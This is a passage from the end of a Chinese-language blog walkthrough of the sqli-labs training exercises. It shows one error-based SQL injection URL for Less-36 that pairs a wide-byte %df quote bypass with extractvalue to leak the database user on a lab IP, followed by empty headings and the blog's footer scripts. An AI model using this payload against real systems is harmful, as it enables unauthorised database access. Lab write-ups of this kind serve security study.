<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.7/sqli/Less-36/?id=%df' and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>))) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<h1 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h1><h1 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h1></div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ye1s</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://blog.cfyqy.com/article/6d9c4fd7.html">https://blog.cfyqy.com/article/6d9c4fd7.html</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.cfyqy.com">ye1s</a>！</span></div></div><div class="post-copyright" id="comments-container"><script src="/js/comments/gitment.js"></script></div><script>let arr = location.href.split('/#more')[0].split('/');
let title = arr[arr.length - 1];
if (title === '') {
    title = arr[arr.length - 2]
}
var flag = false;
var gitFun = function () {
    try {
        var gitmentObj = window.GLOBAL_CONFIG.gitment;
        var gitment = new Gitment({
            id: decodeURI(title), // 可选。默认为 location.href
            owner: gitmentObj.owner,
            repo: gitmentObj.repo,
            oauth: {
                client_id: gitmentObj.client_id,
                client_secret: gitmentObj.client_secret
            },
        });
        gitment.render('comments-container');
        flag = true;
    } catch (e) {
        flag = false;
    }
}
var setIn = setInterval(() => {
    if (!flag) {
        gitFun();
    } else {
        clearInterval(setIn);
    }
}, 200);</script></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/8f3fc18d.html"><i class="fas fa-angle-left">&nbsp;</i><span>ATT&amp;CK_Discovery</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/9d8837ef.html"><span>java安全基础</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2017 ～ 2021 By ye1s</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/daovoice.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>